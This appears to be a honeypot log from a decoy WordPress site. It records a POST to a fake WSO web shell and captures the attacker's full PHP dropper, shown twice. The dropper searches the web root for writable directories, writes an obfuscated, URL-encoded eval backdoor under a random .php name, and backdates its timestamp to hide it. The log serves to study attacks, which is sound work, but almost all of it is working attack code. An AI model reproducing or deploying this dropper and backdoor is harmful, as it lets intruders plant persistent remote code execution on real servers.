
_SERVER
Array
(
    [UNIQUE_ID] => W@a0MCUuUsrSrCVG07sjvQAAAAA
    [SCRIPT_URL] => /wp-content/plugins/wp-db-backup-made/system.php
    [SCRIPT_URI] => http://stratigery.com/wp-content/plugins/wp-db-backup-made/system.php
    [HTTP_HOST] => stratigery.com
    [HTTP_CONNECTION] => close
    [CONTENT_LENGTH] => 11956
    [HTTP_ACCEPT_LANGUAGE] => en-US,en;q=0.8
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    [HTTP_REFERER] => http://stratigery.com/wp-content/plugins/wp-db-backup-made/system.php
    [HTTP_COOKIE] => 227e948fdbaaeccbbb7b3f42fbe848e8=227e948fdbaaeccbbb7b3f42fbe848e8; d8670190bc460b6abebf276d20db5892=63a9f0ea7bb98050796b649e85481845
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.37 (Unix) PHP/7.2.11
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 103.43.46.26
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 44072
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.0
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wp-content/plugins/wp-db-backup-made/system.php
    [SCRIPT_NAME] => /wp-content/plugins/wp-db-backup-made/system.php
    [PHP_SELF] => /wp-content/plugins/wp-db-backup-made/system.php
    [REQUEST_TIME_FLOAT] => 1541846064.279
    [REQUEST_TIME] => 1541846064
)

_REQUEST
Array
(
    [a] => RC
    [p1] => if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}


$payload_file = "%3C%3Fphp%0A%24agnwxu%20%3D%20%27d_xib9c7yn%5C%275m%231lkgv4op%2A0etsHra3f2u8-%27%3B%24jbbsxpu%20%3D%20Array%28%29%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B27%5D.%24agnwxu%5B22%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B13%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B14%5D.%24agnwxu%5B34%5D.%24agnwxu%5B23%5D.%24agnwxu%5B31%5D.%24agnwxu%5B34%5D.%24agnwxu%5B14%5D.%24agnwxu%5B19%5D.%24agnwxu%5B4%5D.%24agnwxu%5B35%5D.%24agnwxu%5B29%5D.%24agnwxu%5B31%5D.%24agnwxu%5B31%5D.%24agnwxu%5B14%5D.%24agnwxu%5B35%5D.%24agnwxu%5B19%5D.%24agnwxu%5B11%5D.%24agnwxu%5B34%5D.%24agnwxu%5B19%5D.%24agnwxu%5B35%5D.%24agnwxu%5B29%5D.%24agnwxu%5B31%5D.%24agnwxu%5B11%5D.%24agnwxu%5B32%5D.%24agnwxu%5B35%5D.%24agnwxu%5B7%5D.%24agnwxu%5B23%5D.%24agnwxu%5B7%5D.%24agnwxu%5B14%5D.%24agnwxu%5B7%5D.%24agnwxu%5B30%5D.%24agnwxu%5B32%5D.%24agnwxu%5B0%5D.%24agnwxu%5B19%5D.%24agnwxu%5B30%5D.%24agnwxu%5B14%5D.%24agnwxu%5B5%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B6%5D.%24agnwxu%5B20%5D.%24agnwxu%5B33%5D.%24agnwxu%5B9%5D.%24agnwxu%5B25%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B26%5D.%24agnwxu%5B25%5D.%24agnwxu%5B28%5D.%24agnwxu%5B1%5D.%24agnwxu%5B28%5D.%24agnwxu%5B24%5D.%24agnwxu%5B21%5D.%24agnwxu%5B24%5D.%24agnwxu%5B29%5D.%24agnwxu%5B25%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B24%5D.%24agnwxu%5B2%5D.%24agnwxu%5B21%5D.%24agnwxu%5B15%5D.%24agnwxu%5B20%5D.%24agnwxu%5B0%5D.%24agnwxu%5B24%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B26%5D.%24agnwxu%5B33%5D.%24agnwxu%5B4%5D.%24agnwxu%5B26%5D.%24agnwxu%5B25%5D.%24agnwxu%5B28%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B29%5D.%24agnwxu%5B28%5D.%24agnwxu%5B28%5D.%24agnwxu%5B29%5D.%24agnwxu%5B8%5D.%24agnwxu%5B1%5D.%24agnwxu%5B12%5D.%24agnwxu%5B24%5D.%24agnwxu%5B28%5D.%24agnwxu%5B17%5D.%24agnwxu%5B24%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B26%5D.%24agnwxu%5B25%5D.%24agnwxu%5B28%5D.%24agnwxu%5B15%5D.%24agnwxu%5B24%5D.%24agnwxu%5B9%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B21%5D.%24agnwxu%5B29%5D.%24agnwxu%5B6%5D.%24agnwxu%5B16%5D%3Bforeach%20%28%24jbbsxpu%5B7%5D%28%24_COOKIE%2C%20%24_POST%29%20as%20%24dvjgn%20%3D%3E%20%24rcovbzz%29%7Bfunction%20mzrzoo%28%24jbbsxpu%2C%20%24dvjgn%2C%20%24acgjjp%29%7Breturn%20%24jbbsxpu%5B6%5D%28%24jbbsxpu%5B4%5D%28%24dvjgn%20.%20%24jbbsxpu%5B2%5D%2C%20%28%24acgjjp%20/%20%24jbbsxpu%5B8%5D%28%24dvjgn%29%29%20%2B%201%29%2C%200%2C%20%24acgjjp%29%3B%7Dfunction%20iypjpq%28%24jbbsxpu%2C%20%24jkfuu%29%7Breturn%20%40%24jbbsxpu%5B9%5D%28%24jbbsxpu%5B0%5D%2C%20%24jkfuu%29%3B%7Dfunction%20ssczli%28%24jbbsxpu%2C%20%24jkfuu%29%7B%24dfojslz%20%3D%20%24jbbsxpu%5B3%5D%28%24jkfuu%29%20%25%203%3Bif%20%28%21%24dfojslz%29%20%7Beval%28%24jkfuu%5B1%5D%28%24jkfuu%5B2%5D%29%29%3Bexit%28%29%3B%7D%7D%24rcovbzz%20%3D%20iypjpq%28%24jbbsxpu%2C%20%24rcovbzz%29%3Bssczli%28%24jbbsxpu%2C%20%24jbbsxpu%5B5%5D%28%24jbbsxpu%5B1%5D%2C%20%24rcovbzz%20%5E%20mzrzoo%28%24jbbsxpu%2C%20%24dvjgn%2C%20%24jbbsxpu%5B8%5D%28%24rcovbzz%29%29%29%29%3B%7D";
$payload_name = "";

srand(time());

/////////////////////////////////////////////////////////
if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

function GetPathDiff($base_path, $full_path)
{
    $pos = strpos($full_path, $base_path);

    if ($pos === FALSE)
    {
        return FALSE;
    }

    return substr($full_path, $pos + strlen($base_path));
}

function GetWritableDirs()
{
	$res = Array();

	$analysys_queue = Array();

	$analysys_queue[] = GetDocRoot();

	$self_path = $_SERVER['SCRIPT_FILENAME'];
	while (($slash = strrpos($self_path, DIRECTORY_SEPARATOR)) !== FALSE)
	{
		$self_path = substr($self_path, 0, $slash);

        if ($self_path == GetDocRoot())
        {
            break;
        }

		if (strlen($self_path))
		{
			$analysys_queue[] = $self_path;
		}
	}

	foreach ($analysys_queue as $current_dir)
	{
		if (!in_array($current_dir, $res))
		{
			$res = array_merge($res, GetDirectoryList($current_dir));
		}
	}
	$res = array_merge($analysys_queue, $res);

	return CheckWritable(array_unique($res));
}

function CheckWritable($dir_list)
{
	$dir_list_writable = Array();

	foreach ($dir_list as $dir)
	{
		if (@is_writable($dir) == TRUE)
		{
			$dir_list_writable[] = $dir;
		}
	}

	return $dir_list_writable;
}

function GetDirectoryList($dir, $depth=10000)
{

	$result = array();
	$dir_count = 0;

	if ($depth == 0)
	{
		return $result;
	}

	$dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
	$h = @opendir($dir);
	if ($h === FALSE)
	{
		return $result;
	}

	while (($f = readdir($h)) !== FALSE)
	{
		if ($f !== '.' and $f !== '..')
		{
			$current_dir = "$dir/$f";
			if (is_dir($current_dir))
			{
				$dir_count += 1;

				if ($dir_count >= $depth)
				{
					break;
				}

				$result[] = $current_dir;
				$result = array_merge($result, GetDirectoryList($current_dir, $depth / 10));
			}
		}
	}

	closedir($h);

	return $result;
}

function GetDocRoot()
{
    $request_uri = "";
    if (strpos($_SERVER['REQUEST_URI'], "?") !== FALSE)
    {
        $request_uri = explode("?", $_SERVER['REQUEST_URI']);
        $request_uri = $request_uri[0];
    }
    else
    {
        $request_uri = $_SERVER['REQUEST_URI'];
    }

	$docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $request_uri);
	if ($docroot_end === FALSE)
	{
		return $_SERVER['DOCUMENT_ROOT'];
	}
	elseif ($docroot_end === 0)
	{
		return "/";
	}
	else
	{
		return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
	}
}

function GetPayload($payload)
{
    $current_payload = rawurldecode($payload);

    return $current_payload;
}

function WritePayload($path, $payload)
{
    if (!@file_exists($path))
    {
        if (@file_put_contents($path, GetPayload($payload)) != FALSE)
        {
            return TRUE;
        }
    }

    return FALSE;
}

////////////////////////////////////////////////////////////////////////////////////////////

# get base local and remote path
$base_www_path = $host = @$_SERVER['HTTP_HOST'];
$base_local_path = GetDocRoot();

if (!($base_local_path_time = @stat($base_local_path."/.htaccess")))
{
    if (!($base_local_path_time = @stat($base_local_path."/index.php")))
    {
        if (!($base_local_path_time = @stat($base_local_path."/index.html")))
        {
            if (!($base_local_path_time = @stat($base_local_path."/..")))
            {
                if (!($base_local_path_time = @stat($base_local_path)))
                {
					$base_local_path_time = Array();
					$base_local_path_time['mtime'] = time();
                }
            }
        }
    }
}

$base_local_path_time = $base_local_path_time['mtime'];

$dir_list_writable = GetWritableDirs();

if (count($dir_list_writable) == 0)
{
    echo "STATUS_UNWRITABLE";
    exit();
}

shuffle($dir_list_writable);

# try to upload
$max_tryes = strlen($payload_name) == 0 ? 10 : 1;
foreach ($dir_list_writable as $current_dir)
{
    // if payload name is set, no more one try to upload on current dir
    for ($i=0; $i < $max_tryes; $i++)
    {
        if (strlen($payload_name) == 0)
        {
            $temp_payload_name = substr(str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyz', mt_rand(1,8))),1,8) . ".php";
        }
        else
        {
            $temp_payload_name = $payload_name;
        }

        $full_payload_name = $current_dir . DIRECTORY_SEPARATOR . $temp_payload_name;

        $uri_path = GetPathDiff($base_local_path, $full_payload_name);
        $full_uri = $base_www_path . (strpos($uri_path, "/") == 0 ? $uri_path : "/".$uri_path);

        if (WritePayload($full_payload_name, $payload_file))
        {
            touch($full_payload_name, $base_local_path_time); // set last modification time as root folder
            echo "URL#http://" . $full_uri . PHP_EOL;
            exit();
        }
    }
}

echo "STATUS_CANTUPLOAD";
exit();
)

_COOKIE
 Array
(
    [227e948fdbaaeccbbb7b3f42fbe848e8] => 227e948fdbaaeccbbb7b3f42fbe848e8
    [d8670190bc460b6abebf276d20db5892] => 63a9f0ea7bb98050796b649e85481845
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com/wp-content/plugins/wp-db-backup-made
Acting as WSO, login cookie.
a = RC
p1 = if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}


$payload_file = "%3C%3Fphp%0A%24agnwxu%20%3D%20%27d_xib9c7yn%5C%275m%231lkgv4op%2A0etsHra3f2u8-%27%3B%24jbbsxpu%20%3D%20Array%28%29%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B27%5D.%24agnwxu%5B22%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B13%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B14%5D.%24agnwxu%5B34%5D.%24agnwxu%5B23%5D.%24agnwxu%5B31%5D.%24agnwxu%5B34%5D.%24agnwxu%5B14%5D.%24agnwxu%5B19%5D.%24agnwxu%5B4%5D.%24agnwxu%5B35%5D.%24agnwxu%5B29%5D.%24agnwxu%5B31%5D.%24agnwxu%5B31%5D.%24agnwxu%5B14%5D.%24agnwxu%5B35%5D.%24agnwxu%5B19%5D.%24agnwxu%5B11%5D.%24agnwxu%5B34%5D.%24agnwxu%5B19%5D.%24agnwxu%5B35%5D.%24agnwxu%5B29%5D.%24agnwxu%5B31%5D.%24agnwxu%5B11%5D.%24agnwxu%5B32%5D.%24agnwxu%5B35%5D.%24agnwxu%5B7%5D.%24agnwxu%5B23%5D.%24agnwxu%5B7%5D.%24agnwxu%5B14%5D.%24agnwxu%5B7%5D.%24agnwxu%5B30%5D.%24agnwxu%5B32%5D.%24agnwxu%5B0%5D.%24agnwxu%5B19%5D.%24agnwxu%5B30%5D.%24agnwxu%5B14%5D.%24agnwxu%5B5%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B6%5D.%24agnwxu%5B20%5D.%24agnwxu%5B33%5D.%24agnwxu%5B9%5D.%24agnwxu%5B25%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B26%5D.%24agnwxu%5B25%5D.%24agnwxu%5B28%5D.%24agnwxu%5B1%5D.%24agnwxu%5B28%5D.%24agnwxu%5B24%5D.%24agnwxu%5B21%5D.%24agnwxu%5B24%5D.%24agnwxu%5B29%5D.%24agnwxu%5B25%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B24%5D.%24agnwxu%5B2%5D.%24agnwxu%5B21%5D.%24agnwxu%5B15%5D.%24agnwxu%5B20%5D.%24agnwxu%5B0%5D.%24agnwxu%5B24%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B26%5D.%24agnwxu%5B33%5D.%24agnwxu%5B4%5D.%24agnwxu%5B26%5D.%24agnwxu%5B25%5D.%24agnwxu%5B28%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B29%5D.%24agnwxu%5B28%5D.%24agnwxu%5B28%5D.%24agnwxu%5B29%5D.%24agnwxu%5B8%5D.%24agnwxu%5B1%5D.%24agnwxu%5B12%5D.%24agnwxu%5B24%5D.%24agnwxu%5B28%5D.%24agnwxu%5B17%5D.%24agnwxu%5B24%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B26%5D.%24agnwxu%5B25%5D.%24agnwxu%5B28%5D.%24agnwxu%5B15%5D.%24agnwxu%5B24%5D.%24agnwxu%5B9%5D%3B%24jbbsxpu%5B%5D%20%3D%20%24agnwxu%5B21%5D.%24agnwxu%5B29%5D.%24agnwxu%5B6%5D.%24agnwxu%5B16%5D%3Bforeach%20%28%24jbbsxpu%5B7%5D%28%24_COOKIE%2C%20%24_POST%29%20as%20%24dvjgn%20%3D%3E%20%24rcovbzz%29%7Bfunction%20mzrzoo%28%24jbbsxpu%2C%20%24dvjgn%2C%20%24acgjjp%29%7Breturn%20%24jbbsxpu%5B6%5D%28%24jbbsxpu%5B4%5D%28%24dvjgn%20.%20%24jbbsxpu%5B2%5D%2C%20%28%24acgjjp%20/%20%24jbbsxpu%5B8%5D%28%24dvjgn%29%29%20%2B%201%29%2C%200%2C%20%24acgjjp%29%3B%7Dfunction%20iypjpq%28%24jbbsxpu%2C%20%24jkfuu%29%7Breturn%20%40%24jbbsxpu%5B9%5D%28%24jbbsxpu%5B0%5D%2C%20%24jkfuu%29%3B%7Dfunction%20ssczli%28%24jbbsxpu%2C%20%24jkfuu%29%7B%24dfojslz%20%3D%20%24jbbsxpu%5B3%5D%28%24jkfuu%29%20%25%203%3Bif%20%28%21%24dfojslz%29%20%7Beval%28%24jkfuu%5B1%5D%28%24jkfuu%5B2%5D%29%29%3Bexit%28%29%3B%7D%7D%24rcovbzz%20%3D%20iypjpq%28%24jbbsxpu%2C%20%24rcovbzz%29%3Bssczli%28%24jbbsxpu%2C%20%24jbbsxpu%5B5%5D%28%24jbbsxpu%5B1%5D%2C%20%24rcovbzz%20%5E%20mzrzoo%28%24jbbsxpu%2C%20%24dvjgn%2C%20%24jbbsxpu%5B8%5D%28%24rcovbzz%29%29%29%29%3B%7D";
$payload_name = "";

srand(time());

/////////////////////////////////////////////////////////
if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}

function GetPathDiff($base_path, $full_path)
{
    $pos = strpos($full_path, $base_path);

    if ($pos === FALSE)
    {
        return FALSE;
    }

    return substr($full_path, $pos + strlen($base_path));
}

function GetWritableDirs()
{
	$res = Array();

	$analysys_queue = Array();

	$analysys_queue[] = GetDocRoot();

	$self_path = $_SERVER['SCRIPT_FILENAME'];
	while (($slash = strrpos($self_path, DIRECTORY_SEPARATOR)) !== FALSE)
	{
		$self_path = substr($self_path, 0, $slash);

        if ($self_path == GetDocRoot())
        {
            break;
        }

		if (strlen($self_path))
		{
			$analysys_queue[] = $self_path;
		}
	}

	foreach ($analysys_queue as $current_dir)
	{
		if (!in_array($current_dir, $res))
		{
			$res = array_merge($res, GetDirectoryList($current_dir));
		}
	}
	$res = array_merge($analysys_queue, $res);

	return CheckWritable(array_unique($res));
}

function CheckWritable($dir_list)
{
	$dir_list_writable = Array();

	foreach ($dir_list as $dir)
	{
		if (@is_writable($dir) == TRUE)
		{
			$dir_list_writable[] = $dir;
		}
	}

	return $dir_list_writable;
}

function GetDirectoryList($dir, $depth=10000)
{

	$result = array();
	$dir_count = 0;

	if ($depth == 0)
	{
		return $result;
	}

	$dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
	$h = @opendir($dir);
	if ($h === FALSE)
	{
		return $result;
	}

	while (($f = readdir($h)) !== FALSE)
	{
		if ($f !== '.' and $f !== '..')
		{
			$current_dir = "$dir/$f";
			if (is_dir($current_dir))
			{
				$dir_count += 1;

				if ($dir_count >= $depth)
				{
					break;
				}

				$result[] = $current_dir;
				$result = array_merge($result, GetDirectoryList($current_dir, $depth / 10));
			}
		}
	}

	closedir($h);

	return $result;
}

function GetDocRoot()
{
    $request_uri = "";
    if (strpos($_SERVER['REQUEST_URI'], "?") !== FALSE)
    {
        $request_uri = explode("?", $_SERVER['REQUEST_URI']);
        $request_uri = $request_uri[0];
    }
    else
    {
        $request_uri = $_SERVER['REQUEST_URI'];
    }

	$docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $request_uri);
	if ($docroot_end === FALSE)
	{
		return $_SERVER['DOCUMENT_ROOT'];
	}
	elseif ($docroot_end === 0)
	{
		return "/";
	}
	else
	{
		return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
	}
}

function GetPayload($payload)
{
    $current_payload = rawurldecode($payload);

    return $current_payload;
}

function WritePayload($path, $payload)
{
    if (!@file_exists($path))
    {
        if (@file_put_contents($path, GetPayload($payload)) != FALSE)
        {
            return TRUE;
        }
    }

    return FALSE;
}

////////////////////////////////////////////////////////////////////////////////////////////

# get base local and remote path
$base_www_path = $host = @$_SERVER['HTTP_HOST'];
$base_local_path = GetDocRoot();

if (!($base_local_path_time = @stat($base_local_path."/.htaccess")))
{
    if (!($base_local_path_time = @stat($base_local_path."/index.php")))
    {
        if (!($base_local_path_time = @stat($base_local_path."/index.html")))
        {
            if (!($base_local_path_time = @stat($base_local_path."/..")))
            {
                if (!($base_local_path_time = @stat($base_local_path)))
                {
					$base_local_path_time = Array();
					$base_local_path_time['mtime'] = time();
                }
            }
        }
    }
}

$base_local_path_time = $base_local_path_time['mtime'];

$dir_list_writable = GetWritableDirs();

if (count($dir_list_writable) == 0)
{
    echo "STATUS_UNWRITABLE";
    exit();
}

shuffle($dir_list_writable);

# try to upload
$max_tryes = strlen($payload_name) == 0 ? 10 : 1;
foreach ($dir_list_writable as $current_dir)
{
    // if payload name is set, no more one try to upload on current dir
    for ($i=0; $i < $max_tryes; $i++)
    {
        if (strlen($payload_name) == 0)
        {
            $temp_payload_name = substr(str_shuffle(str_repeat('abcdefghijklmnopqrstuvwxyz', mt_rand(1,8))),1,8) . ".php";
        }
        else
        {
            $temp_payload_name = $payload_name;
        }

        $full_payload_name = $current_dir . DIRECTORY_SEPARATOR . $temp_payload_name;

        $uri_path = GetPathDiff($base_local_path, $full_payload_name);
        $full_uri = $base_www_path . (strpos($uri_path, "/") == 0 ? $uri_path : "/".$uri_path);

        if (WritePayload($full_payload_name, $payload_file))
        {
            touch($full_payload_name, $base_local_path_time); // set last modification time as root folder
            echo "URL#http://" . $full_uri . PHP_EOL;
            exit();
        }
    }
}

echo "STATUS_CANTUPLOAD";
exit();
Acting as WSO, default listing.
